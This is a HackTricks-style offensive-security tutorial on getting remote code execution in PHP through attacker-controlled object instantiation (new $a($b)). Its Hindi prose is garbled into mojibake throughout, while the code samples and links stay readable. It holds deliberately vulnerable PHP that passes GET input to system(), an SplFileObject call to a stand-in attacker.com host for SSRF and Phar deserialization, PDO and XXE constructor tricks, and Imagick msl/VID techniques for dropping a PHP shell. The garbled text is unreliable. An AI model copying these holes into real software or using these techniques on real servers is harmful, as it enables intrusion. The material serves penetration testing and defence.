# PHP - RCE рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдирд┐рд░реНрдорд╛рдг: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong> AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдкрд░рд┐рдЪрдп

рдЬрдм рдЖрдк рдПрдХ рдирдпрд╛ рдордирдорд╛рдирд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ `new $_GET["a"]($_GET["a"])` рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ [**рдпрд╣ рд▓реЗрдЦрди**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред

## рдХрд╕реНрдЯрдо рдХреНрд▓рд╛рд╕реЗрд╕ рдпрд╛ рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдирд┐рд░реНрдорд╛рдг `new $a($b)` рдореЗрдВ, **рд╡реЗрд░рд┐рдПрдмрд▓ `$a` рдХреНрд▓рд╛рд╕ рдХреЗ рдирд╛рдо рдХреЗ рд▓рд┐рдП рдЦрдбрд╝рд╛ рд╣реИ** рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рд╡реЗрд░рд┐рдПрдмрд▓ **`$b` рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЗ рд▓рд┐рдП рдЦрдбрд╝рд╛ рд╣реИ** рдЬреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдпрджрд┐ `$a` рдФрд░ `$b` GET/POST рд╕реЗ рдЖрддреЗ рд╣реИрдВ, рддреЛ рд╡реЗ **рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдпрд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдРрд░реЗрдЬ** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╡реЗ **JSON** рдпрд╛ рдХрд╣реАрдВ рдФрд░ рд╕реЗ рдЖрддреЗ рд╣реИрдВ, рддреЛ рд╡реЗ **рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреИрд╕реЗ рдХрд┐ рдСрдмреНрдЬреЗрдХреНрдЯ рдпрд╛ рдмреВрд▓рд┐рдпрдиред

рдЖрдЗрдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
рдЗрд╕ рдХреЛрдб рдореЗрдВ, рдЖрдк  `$a`  рдХреЛ  `App`  рдпрд╛  `App2`  рдФрд░  `$b`  рдХреЛ  `uname -a`  рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рдХрдорд╛рдВрдб  `uname -a`  рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред

рдЬрдм рдЖрдкрдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдРрд╕реА рдХреЛрдИ рднреА рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рдХреНрд▓рд╛рд╕реЗрд╕ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВ, рдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЖрд╡рд╢реНрдпрдХ рдХреНрд▓рд╛рд╕ рдПрдХ рдЕрд▓рдЧ рдлрд╛рдЗрд▓ рдореЗрдВ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕реЗ рднреЗрджреНрдп рдХреЛрдб рджреНрд╡рд╛рд░рд╛ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддрдм рдЖрдк рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдлрдВрдХреНрд╢рдиреНрд╕ рдкрд░ рдирдЬрд░ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

**рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдлрдВрдХреНрд╢рдиреНрд╕** рдХреЛ `spl_autoload_register` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрд▓рдмреИрдХреНрд╕ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдХреЗ рдпрд╛ `__autoload` рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдХреЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЬрдм рдХрд┐рд╕реА рдЕрдЬреНрдЮрд╛рдд рдХреНрд▓рд╛рд╕ рдХрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рд╡реЗ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
PHP рд╕рдВрд╕реНрдХрд░рдг рдФрд░ рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдореЗрдВ рдХреЛрдб рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

## рдмрд┐рд▓реНрдЯ-рдЗрди рдХреНрд▓рд╛рд╕реЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд╕реНрдЯрдо рдХреНрд▓рд╛рд╕реЗрд╕ рдФрд░ рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк **рдХреЗрд╡рд▓ рдмрд┐рд▓реНрдЯ-рдЗрди PHP рдХреНрд▓рд╛рд╕реЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

PHP рдХреА 100 рд╕реЗ 200 рддрдХ рдмрд┐рд▓реНрдЯ-рдЗрди рдХреНрд▓рд╛рд╕реЗрд╕ рд╣реЛрддреА рд╣реИрдВред рдЙрдирдХреА рд╕рдВрдЦреНрдпрд╛ PHP рд╕рдВрд╕реНрдХрд░рдг рдФрд░ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдЧрдП рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИред рд╕рднреА рдмрд┐рд▓реНрдЯ-рдЗрди рдХреНрд▓рд╛рд╕реЗрд╕ рдХреЛ `get_declared_classes` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХрд╕реНрдЯрдо рдХреНрд▓рд╛рд╕реЗрд╕ рдХреЗ рд╕рд╛рде:
```php
var_dump(get_declared_classes());
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд╡рд╛рдж рд╣реИ:

рдЙрдкрдпреЛрдЧреА рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░реНрд╕ рд╡рд╛рд▓реА рдХреНрд▓рд╛рд╕реЗрд╕ [рд░рд┐рдлреНрд▓реЗрдХреНрд╢рди API](https://www.php.net/manual/en/book.reflection.php) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

рд░рд┐рдлреНрд▓реЗрдХреНрд╢рди API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░реНрд╕ рдФрд░ рдЙрдирдХреЗ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдирд╛: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

рдпрджрд┐ рдЖрдк **рдХрдИ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рдордирдорд╛рдиреЗ рддрд░реАрдХреЗ рд╕реЗ рдореЗрдердбреНрд╕ рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк **рдХреЗрд╡рд▓ рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдмрдирд╛рдИ рдЧрдИ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдХреЛрдИ рдХреЙрд▓реНрд╕ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ**, рддреЛ **рд▓рдЧрднрдЧ рдХреБрдЫ рднреА рдирд╣реАрдВ** рд╣реИред

рдореБрдЭреЗ `new $a($b)` рд╕реЗ рдХреБрдЫ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдХреЗрд╡рд▓ рддреАрди рддрд░реАрдХреЗ рдкрддрд╛ рд╣реИрдВред

### **SSRF + Phar рдбрд┐рд╕реЗрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди**

`SplFileObject` рдХреНрд▓рд╛рд╕ рдПрдХ рдРрд╕рд╛ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рд▓рд╛рдЧреВ рдХрд░рддреА рд╣реИ рдЬреЛ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рдиреАрдп рдпрд╛ рд░рд┐рдореЛрдЯ URL рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
```
new SplFileObject('http://attacker.com/');
```
рдпрд╣ SSRF рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, PHP < 8.0 рдореЗрдВ SSRF рдХреЛ Phar рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд╕рд╛рде рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ deserialization рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **PDOs рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛**

PDO рдХреНрд▓рд╛рд╕ рдореЗрдВ рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╣реИ:
```php
new PDO("sqlite:/tmp/test.txt")
```
`PDO` рдирд┐рд░реНрдорд╛рддрд╛ DSN рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╣рдореЗрдВ **рд╕реНрдерд╛рдкрд┐рдд рдбреЗрдЯрд╛рдмреЗрд╕ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рдиреАрдп рдпрд╛ рджреВрд░рд╕реНрде рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЬреБрдбрд╝рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, SQLite рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЦрд╛рд▓реА рдлрд╛рдЗрд▓реЗрдВ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

### **SoapClient/SimpleXMLElement XXE**

PHP тЙд 5.3.22 рдФрд░ тЙд 5.4.12 рдореЗрдВ, SoapClient рдХрд╛ рдирд┐рд░реНрдорд╛рддрд╛ **XXE рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдерд╛**ред SimpleXMLElement рдХрд╛ рдирд┐рд░реНрдорд╛рддрд╛ рднреА XXE рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдерд╛, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рд▓рд┐рдП libxml2 < 2.9 рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереАред

## RCE via Imagick Extension

рдЖрдк рдЬрд┐рд╕ **рдкреНрд░реЛрдЬреЗрдХреНрдЯ** рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЙрд╕рдХреА **рдирд┐рд░реНрднрд░рддрд╛рдУрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдЖрдк **рдирдИ рдХреНрд▓рд╛рд╕реЗрд╕** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ **рдХрдорд╛рдВрдбреНрд╕ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдирдИ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдХрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, **Imagick** рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдкрд╛рдпрд╛ рдЧрдпрд╛ред

### VID рдкрд╛рд░реНрд╕рд░

VID рдкрд╛рд░реНрд╕рд░ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рднреА рдордирдорд╛рдиреЗ рдкрде рдкрд░ рдордирдорд╛рдиреА рд╕рд╛рдордЧреНрд░реА рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╡реЗрдм рдкреЗрдЬ рд╕реЗ рд╕реБрд▓рдн рдлреЛрд▓реНрдбрд░ рдореЗрдВ PHPshell рд▓рд┐рдЦрдиреЗ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VID Parser + FIle Upload

рдЬрдм PHP рдореЗрдВ рдПрдХ рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдпрд╣ рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ `/tmp/phpXXXXXX` рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИред Imagick рдХрд╛ VID рдкрд╛рд░реНрд╕рд░ **msl** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд╕рд╛рде рдлрд╛рдЗрд▓ рдкрдереЛрдВ рдореЗрдВ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдбреНрд╕ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рддрд╛рдХрд┐ рдЕрд╕реНрдерд╛рдпреА рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╛рдЗрд▓ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХреЗ) рдФрд░ **рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рдордирдорд╛рдиреЗ рд╕реНрдерд╛рди рдкрд░ рдХреЙрдкреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдпрд╣ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдордирдорд╛рдиреА рдлрд╛рдЗрд▓ рд▓реЗрдЦрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ:

![](<../../../.gitbook/assets/image (159).png>)

### PHP Crash + Brute Force

[**рдореВрд▓ рд▓реЗрдЦ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) рдиреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдмрддрд╛рдпрд╛ рдерд╛ рдЬрд┐рд╕рдореЗрдВ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдлрд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛** рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЙрд╕ рдлрд╛рдЗрд▓ рдХреЛ рд╣рдЯрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ **рдХреНрд░реИрд╢ рдХрд░рдирд╛** рдФрд░ рдлрд┐рд░ рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рдХреЗ рдирд╛рдо рдХреЛ **рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдирд╛** рдЬрдм рддрдХ **Imagick рдордирдорд╛рдиреЗ PHP рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рдХрд░рддрд╛**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд╛рд╣рд┐рд░рд╛ рддреМрд░ рдкрд░ **рдХреНрд░реИрд╢ рдЯреНрд░рд┐рдХ** рдХреЗрд╡рд▓ **ImageMagick рдХреЗ рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдХрд╛рдо рдХрд░рддреА рдереА**ред

## рд╕рдВрджрд░реНрдн

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
